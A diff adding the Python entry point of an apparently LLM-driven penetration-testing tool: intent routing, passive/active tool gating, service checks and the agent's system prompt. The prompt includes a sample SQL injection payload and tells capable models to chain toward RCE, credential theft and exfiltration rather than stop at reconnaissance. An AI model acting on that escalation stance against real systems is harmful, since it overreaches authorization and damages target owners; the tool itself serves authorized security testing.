@@ -1,0 +1,1989 @@
+"""F203.A — `kryon investigate` entry point (open-ended ReAct loop).
+
+A diferencia de `kryon engage` (que tiene fases fijas 1-6 con target IP
++ scope rígido), `investigate` deja al agent decidir qué hacer.
+
+Casos de uso:
+    kryon investigate "audita la seguridad de https://eaula.ing.una.py"
+    kryon investigate "qué CVEs aplican a nginx 1.18"
+    kryon investigate ./codigo/   (SAST exploratorio)
+    kryon investigate --url https://target.example.com/
+
+Diseño:
+- El prompt del usuario va directo al unified_agent.
+- Skills se cargan dinámicamente vía SkillLoader.match(user_msg=prompt).
+- web_fetch_smart está siempre disponible (F203.B).
+- max_turns alto (default 30) — el agent decide cuándo parar.
+- Sin fases discrete — un solo loop hasta que el agent emite "done"
+  o se acaba el budget.
+
+Banca-safe contract:
+- Por default, NO ejecuta tools activas contra targets externos.
+- KRYON_INVESTIGATE_ACTIVE=1 habilita active probing (nmap/nuclei/etc).
+- Default mode = passive: solo web_fetch_smart + duckduckgo_search +
+  knowledge base lookups.
+"""
+
+from __future__ import annotations
+
+import argparse
+import asyncio
+import logging
+import os
+import re
+import sys
+from pathlib import Path
+from typing import Any
+
+from kryon.util.concurrency import run_with_timeout as _run_with_timeout
+from kryon.util.env import is_red_team
+
+logger = logging.getLogger(__name__)
+
+
+def _is_url(s: str) -> bool:
+    return s.startswith("http://") or s.startswith("https://")
+
+
+def _is_local_path(s: str) -> bool:
+    return Path(s).expanduser().exists()
+
+
+def _classify_intent(prompt: str) -> dict[str, Any]:
+    """Heuristic: detect what kind of investigation the user wants.
+
+    Returns hints for skill matching + tool prefiltering.
+    """
+    lower = prompt.lower()
+    hints: dict[str, Any] = {"keywords": [], "mode": "general"}
+
+    # URL detection
+    urls: list[str] = []
+    for word in prompt.split():
+        if _is_url(word):
+            urls.append(word.rstrip("),.;"))
+    if urls:
+        hints["urls"] = urls
+        hints["mode"] = "web_audit"
+        hints["keywords"].extend(
+            [
+                "webapp",
+                "web vulnerability",
+                "http",
+                "cwe-79",
+                "cwe-89",
+                "cwe-352",
+                "cwe-22",
+                "cwe-918",
+            ]
+        )
+
+    # Code path detection — but never let a stray "." / ".." / sentence-punctuation
+    # token silently hijack the mode into code_sast. That bug made an URL-audit query
+    # containing a trailing " . " (e.g. "…app.example.com . El dueño…") route to a
+    # SAST review of the CWD instead of auditing the web target.
+    for word in prompt.split():
+        cand = word.rstrip("),.;:")
+        if cand in ("", ".", "..", "./", "../"):
+            continue  # bare CWD/punctuation markers never select code_sast
+        try:
+            is_dir = Path(cand).expanduser().is_dir()
+        except OSError:
+            continue
+        if not is_dir:
+            continue
+        # A local dir routes to SAST only when it looks intentional: it has a path
+        # separator, OR there is no competing target URL. This keeps `investigate
+        # ./code/` working while stopping an ambiguous bare word from an URL query
+        # from hijacking the mode.
+        looks_like_path = ("/" in cand) or ("\\" in cand)
+        if urls and not looks_like_path:
+            continue
+        if urls and Path(cand).expanduser().resolve() == Path.cwd().resolve():
+            continue
+        hints["mode"] = "code_sast"
+        hints["code_path"] = cand
+        hints["keywords"].extend(["sast", "code review", "source code"])
+        break
+
+    # Topic-based hints
+    if "cve" in lower or "vulnerability" in lower or "exploit" in lower:
+        hints["keywords"].extend(["cve", "vulnerability", "exploit"])
+    if "moodle" in lower:
+        hints["keywords"].extend(["moodle", "lms", "webapp"])
+    if "wordpress" in lower or "wp-" in lower:
+        hints["keywords"].extend(["wordpress", "wp", "webapp"])
+    if any(k in lower for k in ("login", "auth", "jwt", "session")):
+        hints["keywords"].extend(["auth", "authentication", "cwe-287"])
+    if any(k in lower for k in ("sql", "sqli", "injection")):
+        hints["keywords"].extend(["sqli", "sql injection", "cwe-89"])
+    if any(k in lower for k in ("xss", "cross-site")):
+        hints["keywords"].extend(["xss", "cwe-79"])
+
+    return hints
+
+
+def _route_investigate_mode(prompt: str, url: str | None) -> dict[str, Any]:
+    """Classify intent, then let an explicit ``--url`` override prompt heuristics.
+
+    An explicit web target is authoritative: prompt phrasing (a stray ``.``, an
+    ambiguous local dir name) must never route it to ``code_sast``. Closes the gap
+    where ``investigate --url https://target`` still ran a SAST review of the CWD.
+    """
+    hints = _classify_intent(prompt)
+    if url and _is_url(url):
+        hints["mode"] = "web_audit"
+        hints.pop("code_path", None)
+        urls = hints.setdefault("urls", [])
+        if url not in urls:
+            urls.append(url)
+    return hints
+
+
+def _enforce_passive_toolset(agent) -> int:
+    """Technical passive gate: drop every tool above the ``passive`` tier from the
+    agent's toolset (nmap/nuclei/sqlmap/hydra/run_command/… and unknown tools, which
+    classify as ``active``). Returns the count removed. This makes passive mode a
+    real restriction instead of a prompt the model can ignore."""
+    from kryon.agents.authorization import _TIERS, _tool_tier  # noqa: PLC0415
+
+    tools = getattr(agent, "tools", None)
+    if not tools:
+        return 0
+    kept, dropped = [], 0
+    for t in tools:
+        if _tool_tier(getattr(t, "name", "")) <= _TIERS["passive"]:
+            kept.append(t)
+        else:
+            dropped += 1
+    agent.tools = kept
+    return dropped
+
+
+def _build_investigate_prompt(user_prompt: str, hints: dict[str, Any], active: bool) -> str:
+    """Compose the system context the agent receives at turn 1."""
+    mode = hints.get("mode", "general")
+    safety = (
+        "🟢 PASSIVE MODE — Solo usa: web_fetch_smart (HTTP GET), "
+        "duckduckgo_search, y las tools on-demand request_skill / tool_search. "
+        "NO ejecutes nmap, nuclei, sqlmap, nikto, ni ninguna tool activa "
+        "contra targets externos sin autorización.\n"
+        if not active
+        else "🔴 ACTIVE MODE — Tools activas autorizadas (nmap/nuclei/sqlmap). "
+        "Validar que hay autorización escrita ANTES de probar.\n"
+    )
+
+    urls_block = ""
+    if hints.get("urls"):
+        urls_block = "\nURLs detectadas en el prompt: " + ", ".join(hints["urls"]) + "\n"
+
+    code_block = ""
+    if hints.get("code_path"):
+        code_block = f"\nPath local detectado: {hints['code_path']}\n"
+
+    # Stance de parada: un modelo capable DRIVE hacia impacto — "objetivo
+    # cubierto" para él es impacto real / vectores agotados, no recon cubierto.
+    # El 4B recibe la regla de parada conservadora (narra y termina).
+    from kryon.util.env import is_capable_model  # noqa: PLC0415
+
+    if is_capable_model():
+        stop_rule = (
+            "5. **Parar** cuando: (a) alcanzaste impacto real (RCE, creds, dump de "
+            "DB, exfil) o agotaste los vectores explotables tras encadenar lo que "
+            "tenías, (b) sin authorization explícita para profundizar, o (c) se "
+            "necesita info externa que el operador debe proveer. NO pares solo "
+            "porque cubriste el recon del objetivo — encadená hacia impacto.\n"
+        )
+    else:
+        stop_rule = (
+            "5. **Parar** cuando: (a) el objetivo del operador está cubierto, "
+            "(b) sin authorization explícita para profundizar, o (c) se necesita info "
+            "externa que el operador debe proveer.\n"
+        )
+
+    # A4: para un capable, "A verificar" se vuelve un off-ramp para narrar lo que debería
+    # ejecutar. Reservarla a lo genuinamente no-ejecutable (fuera de scope / tool ausente),
+    # no a "no lo intenté". El 4B/recon la usa tal cual (no encadena explotación).
+    verificar_scope = (
+        "**Esta sección es SOLO para lo que NO PODÉS ejecutar** (requiere autorización "
+        "adicional, herramienta ausente, o fuera de scope). Si tenés la tool para probarlo, "
+        "EJECUTALO y movelo a Confirmados — NO la uses como excusa para narrar lo que no "
+        "intentaste. "
+        if is_capable_model()
+        else ""
+    )
+
+    return (
+        f"# Investigación abierta\n\n"
+        f"**Modo**: {mode}\n\n"
+        f"{safety}\n"
+        f"## Pedido del operador\n\n"
+        f"{user_prompt}\n"
+        f"{urls_block}{code_block}\n\n"
+        f"## Loop esperado\n\n"
+        f"1. **Observar**: empezá con evidencia fresca (`web_fetch_smart` o equivalente). "
+        f"NO confíes en conocimiento previo sin verificar. Regla de re-ejecución: re-corré "
+        f"una tool/detector cuando tu hipótesis lo justifique (otros params/endpoints), NO "
+        f"solo para re-confirmar lo que el motor determinista ya inyectó.\n"
+        f"2. **Reflexionar**: ¿qué aprendí que NO sabía? ¿qué hipótesis sigue abierta?\n"
+        f"3. **Decidir**: ¿qué tool siguiente aporta más signal? Si no sabés, "
+        f"buscá en knowledge base o web search.\n"
+        f"4. **Verificar**: si una tool devuelve algo confuso, repetí con args distintos "
+        f"o cross-validar con otra fuente. NO emitas findings basados en una sola señal.\n"
+        f"{stop_rule}\n"
+        f"## Pre-hooks: NO son authoritative (F203.AN)\n\n"
+        f"Si recibís un bloque `deterministic_compliance_findings` / "
+        f"`sqlmap_multi_endpoint_probe` / `nuclei_*_battery` / `idor_sequential_probe` "
+        f"VACÍO o sin findings concretos, **NO interpretes eso como 'target limpio'**. "
+        f"Significa que el detector canned NO matcheó las heurísticas curated. "
+        f"En ese caso DEBÉS:\n"
+        f"  - Continuar con `run_command` manual (curl, sqlmap, nuclei) contra "
+        f"    los endpoints específicos del target.\n"
+        f"  - Para PortSwigger labs: usar el path del lab + query params del lab "
+        f"    (e.g. `?category=Gifts'+OR+1=1--`).\n"
+        f"  - Para webapps custom: descubrir endpoints con `web_fetch_smart` + parsing "
+        f"    de forms en el HTML.\n"
+        f"NUNCA emitas `[]` (findings vacío) sin haber intentado al menos 3 tool calls "
+        f"manuales adicionales.\n\n"
+        f"## Formato del reporte final (OBLIGATORIO — separar confirmado de recomendado)\n\n"
+        f"Emití DOS secciones bien separadas. NO mezcles:\n\n"
+        f"### ✅ Hallazgos confirmados\n"
+        f"Solo vulnerabilidades que **observaste con evidencia** (findings deterministas "
+        f"inyectados arriba + lo que vos verificaste con una tool). Acá SÍ usá la etiqueta "
+        f"`CWE-XXX` por cada hallazgo, con la evidencia concreta. Si no lo confirmaste, NO va acá.\n\n"
+        f"### 🔎 A verificar (NO confirmado)\n"
+        f"Clases de vulnerabilidad que valdría la pena testear pero que **NO confirmaste**. "
+        f"{verificar_scope}"
+        f"Acá describí en prosa el qué y el cómo (ej: 'probar inyección SQL en el parámetro q "
+        f"con sqlmap'). **PROHIBIDO usar la etiqueta `CWE-XXX` en esta sección** — una "
+        f"recomendación no es un hallazgo, y etiquetarla como CWE la haría pasar por confirmada. "
+        f"Usá el nombre de la clase en texto (SQLi, XSS, CSRF…), nunca el código CWE.\n\n"
+        f"Regla de oro: un `CWE-XXX` en el reporte = afirmás que ESE defecto existe y lo viste. "
+        f"Si solo lo sospechás, va en 'A verificar' sin código CWE.\n"
+    )
+
+
+def _safe_call(fn, *args, **kwargs):
+    """Invoke a detector defensively — return [] on any error."""
+    try:
+        r = fn(*args, **kwargs)
+    except Exception:  # noqa: BLE001 — defensive; LLM still runs
+        return []
+    if r is None:
+        return []
+    return r if isinstance(r, list) else [r]
+
+
+_PORT_TO_SVC = {
+    80: "http",
+    443: "https",
+    8080: "http",
+    8000: "http",
+    8443: "https",
+    22: "ssh",
+    21: "ftp",
+    445: "smb",
+    139: "smb",
+    3306: "mysql",
+    5432: "postgres",
+    25: "smtp",
+    23: "telnet",
+    110: "pop3",
+    143: "imap",
+    27017: "mongodb",
+    6379: "redis",
+}
+
+
+def _seed_initial_facts(url: str, findings: list) -> Any:
+    """Seed ExtractedFacts.services from the target URL + the deterministic phase's findings
+    (which already know the open services) so the chain-planner's service-triggered rules
+    fire from turn 1 — instead of depending on the LLM to re-run nmap and the flaky
+    output→fact extraction. Returns None when nothing is seedable."""
+    from urllib.parse import urlparse  # noqa: PLC0415
+
+    from kryon.intelligence.fact_extractor import ExtractedFacts  # noqa: PLC0415
+
+    services: set[tuple[int, str]] = set()
+    hosts: set[str] = set()
+    paths: set[str] = set()
+    parsed = urlparse(url)
+    if parsed.scheme in ("http", "https"):
+        port = parsed.port or (443 if parsed.scheme == "https" else 80)
+        services.add((port, parsed.scheme))
+    if parsed.hostname:
+        # Keep the non-default port on the host: the web rules build `curl http://$H$path`, so a
+        # target on :3000 (Juice Shop) must seed `host:3000` or every directive hits :80 and fails.
+        # Default ports (80/443) stay bare so nmap/ssh rules aren't handed a `host:80`.
+        if parsed.port and parsed.port not in (80, 443):
+            hosts.add(f"{parsed.hostname}:{parsed.port}")
+        else:
+            hosts.add(parsed.hostname)
+    elif url:
+        # Bare host/IP without a scheme (e.g. --url 10.65.160.62 for an AD DC): seed it as a
+        # host WITHOUT guessing an http service — so the autoexec's <target> substitution works
+        # on a non-web target without mis-firing the web-loot rule on a phantom :80.
+        bare = url.split("/")[0].split(":")[0].strip()
+        if bare and re.fullmatch(r"[A-Za-z0-9._-]+", bare):
+            hosts.add(bare)
+    for f in findings or []:
+        asset = str(getattr(f, "affected_asset", "") or getattr(f, "host", "") or "")
+        for m in re.finditer(r":(\d{1,5})\b", asset):
+            port = int(m.group(1))
+            if 1 <= port <= 65535:
+                services.add((port, _PORT_TO_SVC.get(port, "")))
+        # bare host portion (strip :port) — feeds the <target> substitution so the
+        # autoexec'd directive runs against a concrete host, not the literal placeholder.
+        host_part = re.sub(r":\d+.*$", "", asset).strip()
+        if host_part and "/" not in host_part:
+            hosts.add(host_part)
+        # Web-enum discoveries → facts so the planner CHAINS them (enumerate dirs, probe for LFI),
+        # instead of only the model reading them as text and (often) ignoring them. The ffuf-found
+        # dirs/vhosts are the entry points to the next stage (e.g. /scripts -> script.php?page= LFI,
+        # dev.team.thm dev vhost). Knowledge from the wordlist; generic across web boxes.
+        rule_id = str(getattr(f, "rule_id", "") or "")
+        if rule_id == "WEB-ENUM-DIR":
+            # evidence listing: "/scripts (301), /assets (301), /robots.txt (200), ..."
+            for m in re.finditer(r"(/[A-Za-z0-9._~/-]+)", str(getattr(f, "evidence", "") or "")):
+                paths.add(m.group(1))
+        elif rule_id == "WEB-ENUM-VHOST":
+            # message: "virtual host discovered: dev.team.thm (HTTP 200) — added to /etc/hosts"
+            m = re.search(r"discovered:\s*([A-Za-z0-9][A-Za-z0-9.-]+)", str(getattr(f, "message", "") or ""))
+            if m:
+                hosts.add(m.group(1))
+    if not (services or hosts or paths):
+        return None
+    return ExtractedFacts(services=tuple(sorted(services)), hosts=tuple(sorted(hosts)), paths=tuple(sorted(paths)))
+
+
+def _run_deterministic_phase(
+    url: str,
+    *,
+    ssh_user: str = "",
+    ssh_password: str = "",
+    ssh_key: str = "",
+    db_user: str = "",
+    db_password: str = "",
+    include_dns: bool = False,
+    include_smb: bool = False,
+) -> list:
+    """F203.M/N — Hybrid mode: run deterministic checks BEFORE the LLM agent.
+
+    F203.M (N=0): HTTP/HTTPS + MySQL banner-only checks.
+    F203.N.1:    Python http.server exposed + BGP port detect.
+    F203.N.2:    SSH deep audit (creds-aware) + MySQL deep audit (F202.W).
+    F203.N.3:    DNS battery (zone transfer / chaos / dnssec / open resolver /
+                 reverse enum) + SMB anonymous shares — opt-in via flags.
+
+    Skips silently on import/runtime errors — the LLM agent will still run.
+    """
+    from urllib.parse import urlparse
+
+    try:
+        from kryon.cli.engage import (
+            DiscoveredService,
+            _check_admin_open,
+            _check_bgp_exposure,
+            _check_dns_cache_snoop,
+            _check_dns_chaos_leak,
+            _check_dns_dynamic_update,
+            _check_dns_open_resolver,
+            _check_dns_zone_transfer,
+            _check_dnssec_validation,
+            _check_form_csrf,
+            _check_header_quality,
+            _check_http,
+            _check_http_cookie_flags,
+            _check_mysql,
+            _check_mysql_deep,
+            _check_python_simplehttp_exposed,
+            _check_reverse_dns_enum,
+            _check_security_headers,
+            _check_smb_anonymous_shares,
+            _check_ssh,
+        )
+    except ImportError:
+        return []
+
+    parsed = urlparse(url)
+    host = parsed.hostname or ""
+    scheme = (parsed.scheme or "").lower()
+    if not host:
+        return []
+
+    port = parsed.port
+    if port is None:
+        defaults = {
+            "https": 443,
+            "http": 80,
+            "ssh": 22,
+            "mysql": 3306,
+            "postgres": 5432,
+            "postgresql": 5432,
+            "redis": 6379,
+            "mongodb": 27017,
+            "dns": 53,
+            "smb": 445,
+            "cifs": 445,
+        }
+        port = defaults.get(scheme)
+        if port is None:
+            return []
+
+    findings: list = []
+
+    # HTTP / HTTPS
+    if scheme in ("http", "https") or port in (80, 443, 8080, 8443, 8000, 8888):
+        svc = DiscoveredService(
+            host=host,
+            port=port,
+            state="open",
+            service="https" if scheme == "https" or port == 443 else "http",
+        )
+        # These HTTP-branch detectors each issue their own request(s) and are
+        # independent — run them concurrently (I/O-bound; the sequential calls
+        # were ~12s of the phase). _safe_call already never raises.
+        #   _check_http · cookie flags · security headers · header quality ·
+        #   form CSRF (CWE-352) · admin panels open (CWE-284) · python http.server
+        import concurrent.futures as _cf
+
+        _http_checks = (
+            _check_http,
+            _check_http_cookie_flags,
+            _check_security_headers,
+            _check_header_quality,
+            _check_form_csrf,
+            _check_admin_open,
+            _check_python_simplehttp_exposed,
+        )
+        with _cf.ThreadPoolExecutor(max_workers=len(_http_checks)) as _ex:
+            for _r in _ex.map(lambda fn: _safe_call(fn, svc), _http_checks):
+                findings.extend(_r)
+        # The web/app/webapp/default-cred probe modules now run via
+        # probe_registry.run_all_probes(_gsvc) in the gap-closer section below
+        # (gated on HTTP) — no longer wired individually per branch.
+
+    # SSH — F203.N.2 creds-aware deep audit
+    elif scheme == "ssh" or port in (22, 2222):
+        svc = DiscoveredService(host=host, port=port, state="open", service="ssh")
+        # Handshake posture (Terrapin / weak algos / banner→CVE) runs via the
+        # registry gap-closer below; here we do the creds-aware deep audit.
+        ssh_target = f"{ssh_user}@{host}" if ssh_user else None
+        # _check_ssh reads KRYON_SSH_PORT / KRYON_SSH_KEY_PATH from env
+        prior_port = os.environ.get("KRYON_SSH_PORT")
+        prior_key = os.environ.get("KRYON_SSH_KEY_PATH")
+        try:
+            if port != 22:
+                os.environ["KRYON_SSH_PORT"] = str(port)
+            if ssh_key:
+                os.environ["KRYON_SSH_KEY_PATH"] = ssh_key
+            findings.extend(_safe_call(_check_ssh, svc, ssh_target, ssh_password or None))
+        finally:
+            if prior_port is None:
+                os.environ.pop("KRYON_SSH_PORT", None)
+            else:
+                os.environ["KRYON_SSH_PORT"] = prior_port
+            if prior_key is None:
+                os.environ.pop("KRYON_SSH_KEY_PATH", None)
+            else:
+                os.environ["KRYON_SSH_KEY_PATH"] = prior_key
+
+    # MySQL / Postgres / common DB ports
+    elif port in (3306, 33060):
+        svc = DiscoveredService(host=host, port=port, state="open", service="mysql")
+        findings.extend(_safe_call(_check_mysql, svc))
+        # F203.N.2 — F202.W deep audit with creds
+        if db_user and db_password:
+            prior_u = os.environ.get("KRYON_DB_USER")
+            prior_p = os.environ.get("KRYON_DB_PASSWORD")
+            try:
+                os.environ["KRYON_DB_USER"] = db_user
+                os.environ["KRYON_DB_PASSWORD"] = db_password
+                findings.extend(_safe_call(_check_mysql_deep, svc))
+            finally:
+                if prior_u is None:
+                    os.environ.pop("KRYON_DB_USER", None)
+                else:
+                    os.environ["KRYON_DB_USER"] = prior_u
+                if prior_p is None:
+                    os.environ.pop("KRYON_DB_PASSWORD", None)
+                else:
+                    os.environ["KRYON_DB_PASSWORD"] = prior_p
+
+    elif port in (5432, 27017, 6379, 1433, 1521):
+        svc = DiscoveredService(host=host, port=port, state="open", service="database")
+        findings.extend(_safe_call(_check_mysql, svc))
+
+    # F203.N.1 — BGP port exposure
+    elif port == 179:
+        svc = DiscoveredService(host=host, port=179, state="open", service="bgp")
+        findings.extend(_safe_call(_check_bgp_exposure, svc))
+
+    # F203.N.3 — DNS opt-in (port 53 OR dns:// scheme)
+    if include_dns and (port == 53 or scheme == "dns"):
+        svc_dns = DiscoveredService(host=host, port=53, state="open", service="dns")
+        for chk in (
+            _check_dns_open_resolver,
+            _check_dns_zone_transfer,
+            _check_dns_chaos_leak,
+            _check_dns_cache_snoop,  # was missing vs engage (coverage gap)
+            _check_dnssec_validation,
+            _check_reverse_dns_enum,
+            _check_dns_dynamic_update,  # was missing vs engage (coverage gap)
+        ):
+            findings.extend(_safe_call(chk, svc_dns))
+
+    # F203.N.3 — SMB opt-in (port 445 OR smb:// scheme)
+    if include_smb and (port == 445 or scheme in ("smb", "cifs")):
+        svc_smb = DiscoveredService(host=host, port=445, state="open", service="smb")
+        findings.extend(_safe_call(_check_smb_anonymous_shares, svc_smb))
+
+    # Gap-closer service probes (Redis/Mongo/Elastic/SNMP/FTP/RDP/VNC/rsync/Postgres/
+    # NTP/LDAP/Telnet/SMTP) — for when the target URL points at a non-web service port.
+    try:
+        # All port/scheme-gated probe modules (service/ad/legacy/infra/amp/ot/mail/
+        # ssh/tls/web/app/webapp/default-creds/vpn) run through the registry — the
+        # same single wiring engage uses. Adding a detector is a one-line registry edit.
+        from kryon.cli.probe_registry import run_all_probes
+
+        _gsvc = DiscoveredService(host=host, port=port, state="open", service=scheme or "")
+        findings.extend(run_all_probes(_gsvc))
+        # DNS / email-security posture (SPF/DMARC/DKIM/CAA/MTA-STS/TLS-RPT + takeover) —
+        # domain-keyed (not service-keyed), so it stays out of the registry.
+        from kryon.cli.dns_probes import run_dns_probes
+
+        findings.extend(run_dns_probes(host))
+    except Exception:  # noqa: BLE001 — never break the hybrid phase
+        pass
+
+    return findings
+
+
+def _run_openvas_phase(target: str, *, tech_stack: set | None = None, client=None) -> list:
+    """Fase 3 — OpenVAS/Greenbone active vuln scan → engage.Finding list.
+
+    Opt-in (``--openvas``) and double-gated by KRYON_OPENVAS_FIRE (the caller
+    checks ``is_openvas_enabled``). Drives a **stock** Greenbone over GMP
+    arm's-length (gvm-cli subprocess), then normalizes results — one Finding
+    per CVE, QoD→confidence — through the applicability gates. Import errors
+    skip silently; scan/normalize errors propagate to the caller's guard.
+    ``client`` is injectable for testing.
+    """
+    try:
+        from kryon.integrations.openvas import OpenVASClient, results_to_findings, runner_from_env
+    except ImportError:
+        return []
+    scanner = client or OpenVASClient(runner_from_env())
+    xml = scanner.run_scan(target)
+    return results_to_findings(xml, tech_stack=tech_stack or set())
+
+
+def _run_cinc_phase(
+    target: str,
+    *,
+    ssh_user: str = "",
+    ssh_password: str = "",
+    ssh_key: str = "",
+    ssh_port: int = 22,
+    runner=None,
+) -> list:
+    """Cinc Auditor (dev-sec profiles) → engage.Finding list.
+
+    Opt-in (``--cinc``), gated by KRYON_CINC_FIRE (the caller checks). Runs each
+    configured profile over Cinc's own SSH transport; FAILED controls become
+    Findings via the applicability gates. ImportError skips silently;
+    per-profile errors are swallowed. ``runner`` is injectable for testing.
+    """
+    try:
+        from kryon.integrations.cinc import (
+            build_ssh_extra_args,
+            build_target,
+            profiles_from_env,
+            results_to_findings,
+            run_profile,
+        )
+    except ImportError:
+        return []
+
+    cinc_target = build_target(target, ssh_user=ssh_user)
+    extra = build_ssh_extra_args(ssh_key=ssh_key, ssh_password=ssh_password, ssh_port=ssh_port)
+    findings: list = []
+    for profile in profiles_from_env():
+        try:
+            report = run_profile(profile, cinc_target, extra_args=extra, runner=runner)
+            findings.extend(results_to_findings(report, host=target))
+        except Exception:  # noqa: BLE001 — per-profile best-effort
+            continue
+    return findings
+
+
+def _run_lynis_phase(
+    target: str,
+    *,
+    ssh_user: str = "",
+    ssh_key: str = "",
+    ssh_port: int = 22,
+    runner=None,
+) -> list:
+    """Lynis host audit → engage.Finding list.
+
+    Opt-in (``--lynis``), gated by KRYON_LYNIS_FIRE (the caller checks). Lynis is
+    host-local, so we run it ON the target over SSH (reusing the compliance
+    run_cmd transport) unless a ``runner`` is injected (tests). ImportError /
+    LynisError skip silently. Key-based SSH.
+    """
+    try:
+        from kryon.integrations.lynis import LynisError, include_suggestions, report_to_findings, run_audit
+    except ImportError:
+        return []
+
+    _runner = runner
+    if _runner is None:
+        from kryon.compliance.checks.base import CheckContext
+        from kryon.compliance.runner import run_cmd
+
+        ctx = CheckContext(host=target, ssh_user=ssh_user, ssh_key_path=ssh_key, ssh_port=ssh_port)
+
+        def _runner(cmd: str) -> str:
+            return run_cmd(ctx, cmd, shell=True, timeout_s=600)[0]
+
+    try:
+        report = run_audit(runner=_runner)
+    except LynisError:
+        return []
+    return report_to_findings(report, host=target, include_suggestions=include_suggestions())
+
+
+def _load_patch_seeds() -> list | None:
+    """Fase 3 — load recent-CVE patch seeds for the source review, or None.
+
+    Reads the enriched CVE-diff JSONL that ``kryon update --only cve-corpus``
+    writes (default temp path, override via ``KRYON_PATCH_SEED_JSONL``).
+    Deterministic + banca-safe: a plain JSONL parse, no ChromaDB / embeddings /
+    network. Returns None (→ unseeded review) when the corpus is absent or empty
+    so nothing changes for the common case. ``KRYON_PATCH_SEED_ECOSYSTEM``
+    filters seeds to the target stack (e.g. ``pip`` / ``npm``).
+    """
+    import tempfile
+
+    default_path = str(Path(tempfile.gettempdir()) / "kryon_cve_corpus_enriched.jsonl")
+    jsonl = os.environ.get("KRYON_PATCH_SEED_JSONL", "").strip() or default_path
+    if not Path(jsonl).exists():
+        return None
+    try:
+        from kryon.intelligence.patch_seed import load_seeds_from_jsonl
+
+        eco = os.environ.get("KRYON_PATCH_SEED_ECOSYSTEM", "").strip() or None
+        seeds = load_seeds_from_jsonl(jsonl, ecosystem=eco)
+    except Exception:  # noqa: BLE001 — seeding is a boost, never fatal
+        return None
+    return seeds or None
+
+
+def _run_source_review_phase(code_path: str, *, max_files: int = 25) -> list:
+    """Mythos-style source review over a local code tree.
+
+    Runs the file-by-file reasoning review (intelligence.source_review)
+    with the security model and returns engage.Finding objects so they
+    inject into the agent prompt + output exactly like the URL-based
+    deterministic phase. Skips silently on any error — the LLM agent
+    still runs.
+    """
+    try:
+        from kryon.intelligence.source_review import OllamaReviewer, review_tree
+    except ImportError:
+        return []
+
+    root = Path(code_path).expanduser()
+    if not root.exists():
+        return []
+    # Honor the engagement wall budget so a hung review model can't run for
+    # hours (primary + variant files each cost a model call).
+    try:
+        wall = float(os.environ.get("KRYON_WALL_BUDGET_S", "") or 0) or None
+    except ValueError:
+        wall = None
+    # Fase 3 — seed the review with recent CVE fixes when the deterministic
+    # patch-diff corpus is present. Read-only JSONL parse (no ChromaDB, no
+    # embeddings, no net), so it's banca-safe; absent corpus → seeds=None →
+    # ordinary unseeded review. Populate via `kryon update --only cve-corpus`.
+    patch_seeds = _load_patch_seeds()
+    try:
+        result = review_tree(
+            root,
+            reviewer=OllamaReviewer(),
+            max_files=max_files,
+            wall_budget_s=wall,
+            patch_seeds=patch_seeds,
+        )
+    except Exception:  # noqa: BLE001 — defensive; LLM agent still runs
+        return []
+
+    findings = result.findings
+    # Closed zero-day loop (F1+F2+F3): verify every finding against its oracle
+    # — ASAN for memory bugs, a canary harness for injection/deser/traversal —
+    # and filter re-detected known CVEs via the novelty gate, floating
+    # confirmed-and-novel to the top. This is where "harness > modelo" happens.
+    # COSTLY (model PoCs + compiler/interpreters) and it EXECUTES model-generated
+    # PoCs, so it's opt-in and must stay inside the container's isolation
+    # boundary. Banca-safe default OFF; enable for zero-day research runs.
+    if os.environ.get("KRYON_ZERODAY_VERIFY", "").strip().lower() in ("1", "true", "yes", "on"):
+        try:
+            from kryon.intelligence.zeroday_verify import build_default_loop, summarize
+
+            findings = build_default_loop(root)(list(findings))
+            logger.info("zero-day verify loop: %s", summarize(findings).as_line())
+        except Exception:  # noqa: BLE001 — verification is best-effort; raw findings still flow
+            findings = result.findings
+    return [f.to_engage_finding() for f in findings]
+
+
+def _detect_redirect_host(url: str, *, timeout: int = 8) -> str:
+    """If GET <url> redirects (301/302) to a DIFFERENT hostname, return it.
+
+    This is how a bare-IP web target reveals its canonical vhost (e.g.
+    10.x -> creative.thm). The agent used to discover this ad-hoc; doing it
+    deterministically lets us seed /etc/hosts + vhost fuzzing reliably.
+    """
+    import urllib.error
+    import urllib.request
+    from urllib.parse import urlparse
+
+    class _NoRedirect(urllib.request.HTTPRedirectHandler):
+        def redirect_request(self, *a, **k):  # noqa: ANN001, ANN002 — stdlib signature
+            return None
+
+    loc = ""
+    try:
+        opener = urllib.request.build_opener(_NoRedirect)
+        try:
+            resp = opener.open(urllib.request.Request(url, method="GET"), timeout=timeout)
+            loc = resp.headers.get("Location", "") or ""
+        except urllib.error.HTTPError as e:
+            loc = (e.headers.get("Location", "") if e.headers else "") or ""
+    except Exception:  # noqa: BLE001 — best-effort
+        return ""
+
+    if not loc:
+        return ""
+    lh = urlparse(loc if "//" in loc else f"//{loc}").hostname or ""
+    orig = urlparse(url).hostname or ""
+    return lh if (lh and lh != orig and "." in lh) else ""
+
+
+# Hosts the target references but that aren't ITS vhost — public CDNs, schemas, social.
+_PUBLIC_VHOST_NEEDLES = (
+    "w3.org",
+    "schema.org",
+    "gmpg.org",
+    "wordpress.org",
+    "wp.org",
+    "google",
+    "gstatic",
+    "googleapis",
+    "gravatar",
+    "jquery",
+    "cloudflare",
+    "cdnjs",
+    "fonts.",
+    "bootstrap",
+    "github",
+    "githubusercontent",
+    "twitter",
+    "facebook",
+    "youtube",
+    "youtu.be",
+    "vimeo",
+    "purl.org",
+    "creativecommons",
+    "mozilla",
+    "example.com",
+    "localhost",
+)
+# CTF/lab TLDs — a strong signal that a referenced host IS the target's vhost.
+_LAB_VHOST_TLDS = (".thm", ".htb", ".local", ".lan", ".corp", ".internal", ".vm")
+
+
+def _detect_body_vhost(url: str, *, timeout: int = 8) -> str:
+    """Detect a self-referenced vhost from the response BODY when the target does NOT 30x-redirect.
+
+    Many web apps (WordPress siteurl, canonical links, ``api.w.org`` rel) hard-code their canonical
+    hostname in the page even though the bare IP returns 200. THM Internal does exactly this:
+    ``http://10.67.166.177/blog/`` returns 200 with ``http://internal.thm/blog/...`` links everywhere,
+    so ``_detect_redirect_host`` (301/302 only) misses it. Fetches a couple of paths, extracts the
+    referenced hostnames, drops the original host + public CDNs, and returns a lab-TLD host (.thm/.htb/…)
+    if present, else the most-frequently-referenced internal host. ``''`` when nothing qualifies.
+    """
+    import ipaddress
+    import urllib.request
+    from collections import Counter
+    from urllib.parse import urlparse
+
+    orig = (urlparse(url).hostname or "").lower()
+    body = ""
+    base = url.rstrip("/")
+    for path in ("/blog/", "/", "/index.php"):
+        try:
+            req = urllib.request.Request(base + path, headers={"User-Agent": "Mozilla/5.0 kryon"})
